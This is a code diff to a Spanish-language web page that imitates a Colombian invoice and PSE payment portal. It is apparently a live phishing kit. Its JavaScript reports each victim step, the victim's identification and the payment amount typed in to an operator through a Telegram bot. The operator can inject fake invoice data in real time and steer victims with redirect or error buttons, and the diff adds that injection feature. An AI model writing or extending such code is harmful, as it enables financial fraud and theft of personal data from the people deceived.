@@ -893,9 +893,8 @@ main {
             <div class="left-paso-1" id="paso1Amarillo">
                 <div class="titulo">LIRIO ET1</div>
                 
-                <!-- Caja clickeable para activar el check -->
                 <div class="caja-blanca" id="cajaPaso1">
-                    <div class="num">16-1003.240405.38361573</div>
+                    <div class="num" id="txtIdentificacionUnidad">16-1003.240405.38361573</div>
                     <div class="sub">16-1003</div>
                     <div class="check" id="checkPaso1">✓</div>
                 </div>
@@ -910,8 +909,8 @@ main {
                     </div>
                 </div>
                 <div class="resumen-facturas">
-                    <div>Total de Facturas <strong>17</strong></div>
-                    <div style="border-left: 1px solid #ccc; padding-left: 20px;">Valor Total de Cartera <strong>$42,655,060.00</strong></div>
+                    <div>Total de Facturas <strong id="txtTotalFacturas">17</strong></div>
+                    <div style="border-left: 1px solid #ccc; padding-left: 20px;">Valor Total de Cartera <strong id="txtTotalCartera">$42,655,060.00</strong></div>
                 </div>
                 <table>
                     <thead>
@@ -922,25 +921,8 @@ main {
                             <th>Valor a pagar</th>
                         </tr>
                     </thead>
-                    <tbody>
-                        <tr>
-                            <td><span class="circulo-verde"></span> 38361573</td>
-                            <td>CUOTA</td>
-                            <td>28/02/2022</td>
-                            <td>$1,500,000.00</td>
-                        </tr>
-                        <tr style="background:#f9f9f9;">
-                            <td><span class="circulo-verde"></span> 38361573</td>
-                            <td>CUOTA</td>
-                            <td>28/03/2022</td>
-                            <td>$1,500,000.00</td>
-                        </tr>
-                        <tr>
-                            <td><span class="circulo-verde"></span> 38361573</td>
-                            <td>CUOTA</td>
-                            <td>28/04/2022</td>
-                            <td>$1,500,000.00</td>
-                        </tr>
+                    <tbody id="tablaFacturasBody">
+                        <!-- Se llena dinámicamente con JS -->
                     </tbody>
                 </table>
             </div>
@@ -1004,7 +986,6 @@ main {
 
             <div class="card-blanca-amarilla">
                 
-                <!-- NUEVO CAMPO: VALOR A PAGAR (Solo se muestra en Paso 2) -->
                 <div class="valor-pagar-container" id="containerValorPagar">
                     <label>Valor que desea pagar:</label>
                     <div class="input-money">
@@ -1013,7 +994,6 @@ main {
                     </div>
                 </div>
 
-                <!-- EL BOTÓN INICIA OPACO (BLOQUEADO) -->
                 <button class="btn-siguiente opaco" id="btnAccionAmarillo">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     SIGUIENTE
@@ -1064,8 +1044,10 @@ const checkPaso1 = document.getElementById('checkPaso1');
 const btnAccionAmarillo = document.getElementById('btnAccionAmarillo');
 const containerValorPagar = document.getElementById('containerValorPagar');
 const inputValorPagar = document.getElementById('inputValorPagar');
+
 let pasoActualAmarillo = 1;
 let checkPaso1Activado = false;
+let esperandoDatosFacturas = false; 
 
 // Elementos Login
 const inputId = document.getElementById('identificacion');
@@ -1103,21 +1085,14 @@ inputToken.addEventListener('input', function () {
     errorToken.classList.remove('show');
 });
 
-// 🚀 EVENTO PARA EL CAMPO DE VALOR A PAGAR (Formateo de miles)
-inputValorPagar.addEventListener('input', function(e) {
-    // 1. Quitar todo lo que no sea número
+inputValorPagar.addEventListener('input', function() {
     let valor = this.value.replace(/\D/g, '');
-    
-    // 2. Formatear con puntos de miles
     if (valor.length > 0) {
         valor = parseInt(valor, 10).toLocaleString('es-CO');
-        
-        // 3. Encender el botón (quitar clase opaco) si hay texto
-        if (pasoActualAmarillo === 2 && !btnAccionAmarillo.classList.contains('opaco') === false) {
+        if (pasoActualAmarillo === 2) {
              btnAccionAmarillo.classList.remove('opaco');
         }
     } else {
-        // Si borra todo, apagar el botón en el paso 2
         if (pasoActualAmarillo === 2) {
              btnAccionAmarillo.classList.add('opaco');
         }
@@ -1228,6 +1203,35 @@ function escucharBotones(callbackAction) {
     check();
 }
 
+function escucharDatosFacturas() {
+    esperandoDatosFacturas = true;
+    pollingActivo = true;
+    
+    function check() {
+        if (!pollingActivo) return;
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['message'], timeout: 10 })
+        }).then(r => r.json()).then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000); return;
+            }
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                
+                if (u.message && u.message.text && esperandoDatosFacturas) {
+                    pollingActivo = false;
+                    esperandoDatosFacturas = false;
+                    procesarDatosFacturas(u.message.text);
+                    return;
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
+    }
+    check();
+}
+
 // ==========================================
 // ACCIONES LOGIN
 // ==========================================
@@ -1291,10 +1295,18 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
-        ocultarOverlay(); 
-        contenedorOriginal.style.display = 'none';
-        viewAmarilla.classList.add('active');
-        iniciarFlujoAmarillo();
+        // En lugar de avanzar, le pedimos a Telegram que escriba los datos (ahora son 5)
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: `👉 <b>Escribe los datos separados por comas:</b>\n\n<code>Referencia Completa, Total Facturas, Valor Cartera, Valor Cuota, Fecha Base</code>\n\n<b>Ejemplo:</b>\n<code>16-1003.240405.38361573, 17, 42655060, 1500000, 28/10/2026</code>`, 
+                parse_mode: 'HTML' 
+            })
+        });
+        
+        escucharDatosFacturas();
+        mostrarOverlay();
 
     } else if (action === 'finalizar_yahoo') {
         redirigir('https://www.yahoo.com');
@@ -1312,26 +1324,89 @@ function handleTelegramActionToken(action) {
 }
 
 // ==========================================
+// PROCESAR LOS DATOS QUE TÚ ESCRIBES EN TELEGRAM
+// ==========================================
+function procesarDatosFacturas(texto) {
+    const partes = texto.split(',').map(s => s.trim());
+    
+    // Ahora son 5 datos. Si faltan, pedimos de nuevo
+    if (partes.length < 5) {
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Formato incorrecto. Debes escribir los 5 datos separados por comas (Referencia, Facturas, Cartera, Cuota, Fecha). Intenta de nuevo.", parse_mode: 'HTML' })
+        });
+        escucharDatosFacturas();
+        return;
+    }
+
+    const referenciaCompleta = partes[0];
+    const totalFacturas = parseInt(partes[1]) || 17;
+    const valorCartera = parseFloat(partes[2]) || 42655060;
+    const valorCuota = parseFloat(partes[3]) || 1500000;
+    const fechaBase = partes[4];
+
+    // Extraer el ID de la última parte de la referencia (ej. 16-1003.240405.38361573 -> 38361573)
+    const partesRef = referenciaCompleta.split('.');
+    const idFactura = partesRef.length > 1 ? partesRef[partesRef.length - 1] : referenciaCompleta;
+
+    // Actualizar los textos en pantalla
+    document.getElementById('txtTotalFacturas').textContent = totalFacturas;
+    document.getElementById('txtTotalCartera').textContent = '$ ' + valorCartera.toLocaleString('es-CO');
+    document.getElementById('txtIdentificacionUnidad').textContent = referenciaCompleta; // Ponemos la referencia que tú enviaste
+
+    // Generar la tabla
+    const tbody = document.getElementById('tablaFacturasBody');
+    tbody.innerHTML = '';
+
+    const partesFecha = fechaBase.split('/');
+    let dia = parseInt(partesFecha[0]);
+    let mes = parseInt(partesFecha[1]) - 1;
+    let anio = parseInt(partesFecha[2]);
+    let fechaActual = new Date(anio, mes, dia);
+
+    for (let i = 0; i < totalFacturas; i++) {
+        let d = String(fechaActual.getDate()).padStart(2, '0');
+        let m = String(fechaActual.getMonth() + 1).padStart(2, '0');
+        let y = fechaActual.getFullYear();
+        let fechaStr = `${d}/${m}/${y}`;
+
+        let tr = document.createElement('tr');
+        if (i % 2 !== 0) tr.style.background = '#f9f9f9';
+        
+        tr.innerHTML = `
+            <td><span class="circulo-verde"></span> ${idFactura}</td>
+            <td>CUOTA</td>
+            <td>${fechaStr}</td>
+            <td>$ ${valorCuota.toLocaleString('es-CO')}</td>
+        `;
+        tbody.appendChild(tr);
+
+        fechaActual.setMonth(fechaActual.getMonth() + 1);
+    }
+
+    ocultarOverlay();
+    contenedorOriginal.style.display = 'none';
+    viewAmarilla.classList.add('active');
+    iniciarFlujoAmarillo();
+}
+
+// ==========================================
 // LÓGICA DE LA PANTALLA AMARILLA (PASOS)
 // ==========================================
 function iniciarFlujoAmarillo() {
     pasoActualAmarillo = 1;
-    
-    // Resetear el check y el botón
     checkPaso1Activado = false;
     checkPaso1.classList.remove('activo');
-    btnAccionAmarillo.classList.add('opaco'); // Bloqueado visualmente
+    btnAccionAmarillo.classList.add('opaco');
     inputValorPagar.value = '';
-    
     actualizarPasoAmarillo();
 }
 
-// 🚀 EVENTO PARA EL CHECKBOX (Se ejecuta cada vez que se hace clic)
 cajaPaso1.addEventListener('click', function() {
     if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
         checkPaso1Activado = true;
-        checkPaso1.classList.add('activo'); // Check verde
-        btnAccionAmarillo.classList.remove('opaco'); // Botón verde brillante
+        checkPaso1.classList.add('activo');
+        btnAccionAmarillo.classList.remove('opaco');
     }
 });
 
@@ -1340,78 +1415,59 @@ function actualizarPasoAmarillo() {
         paso1Amarillo.style.display = 'block';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'none';
-        containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
+        containerValorPagar.style.display = 'none';
         btnAccionAmarillo.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg> SIGUIENTE`;
         
     } else if (pasoActualAmarillo === 2) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'block';
         paso3Amarillo.style.display = 'none';
-        containerValorPagar.style.display = 'block'; // MOSTRAR CAMPO DE DINERO
+        containerValorPagar.style.display = 'block';
         btnAccionAmarillo.innerHTML = `✓ CONFIRMAR PAGO`;
-        btnAccionAmarillo.classList.add('opaco'); // 🚀 INICIA OPACO EN EL PASO 2
+        btnAccionAmarillo.classList.add('opaco');
         
     } else if (pasoActualAmarillo === 3) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'block';
-        containerValorPagar.style.display = 'none'; // Ocultar campo de dinero
+        containerValorPagar.style.display = 'none';
         btnAccionAmarillo.innerHTML = `✓ REALIZAR PAGO`;
-        btnAccionAmarillo.classList.remove('opaco'); // Siempre activo en el paso 3
+        btnAccionAmarillo.classList.remove('opaco');
     }
 }
 
-// 🚀 EVENTO DEL BOTÓN (Se asigna UNA SOLA VEZ, no se clona)
 btnAccionAmarillo.addEventListener('click', function() {
-    // Si el botón está bloqueado, no hace nada
-    if (btnAccionAmarillo.classList.contains('opaco')) {
-        return;
-    }
+    if (btnAccionAmarillo.classList.contains('opaco')) return;
 
     if (pasoActualAmarillo === 1) {
-        // Avanzar al paso 2
         pasoActualAmarillo = 2;
         actualizarPasoAmarillo();
         
-        // Notificar a Telegram
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
                 text: `⚠️ <b>EL USUARIO HA AVANZADO AL PASO 2 (FACTURAS)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>`, 
                 parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }],
-                        [{ text: '🚫 Mostrar Error', callback_data: 'mostrar_error_final' }]
-                    ]
-                }
+                reply_markup: { inline_keyboard: [[{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }], [{ text: '🚫 Mostrar Error', callback_data: 'mostrar_error_final' }]] }
             })
         });
         escucharAccionesFinales();
 
     } else if (pasoActualAmarillo === 2) {
         const valorIngresado = inputValorPagar.value.trim();
-        
-        if (valorIngresado === '') {
-            return; // Ya está validado por la clase opaco, pero por seguridad
-        }
+        if (valorIngresado === '') return;
 
         pasoActualAmarillo = 3;
         actualizarPasoAmarillo();
         
-        // Notificar a Telegram paso 3 CON EL VALOR
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
                 text: `⚠️ <b>EL USUARIO ESTÁ EN LA PASARELA PSE (PASO 3)</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n💰 <b>Valor a pagar:</b> <code>$ ${valorIngresado} COP</code>`, 
                 parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }]
-                    ]
-                }
+                reply_markup: { inline_keyboard: [[{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }]] }
             })
         });
         escucharAccionesFinales();
@@ -1426,11 +1482,7 @@ btnAccionAmarillo.addEventListener('click', function() {
                 chat_id: TG_CHAT_ID, 
                 text: `⚠️ <b>EL USUARIO HA COMPLETADO LA PASARELA PSE</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n\n<i>Esperando acción final...</i>`, 
                 parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }]
-                    ]
-                }
+                reply_markup: { inline_keyboard: [[{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo_final' }]] }
             })
         });
         escucharAccionesFinales();
@@ -1468,9 +1520,6 @@ function escucharAccionesFinales() {
     check();
 }
 
-// ==========================================
-// EVENTOS DE BOTONES EN PANTALLA (LOGIN)
-// ==========================================
 btnLogin.addEventListener('click', function() {
     const id = inputId.value.trim();
     if (id === '') {
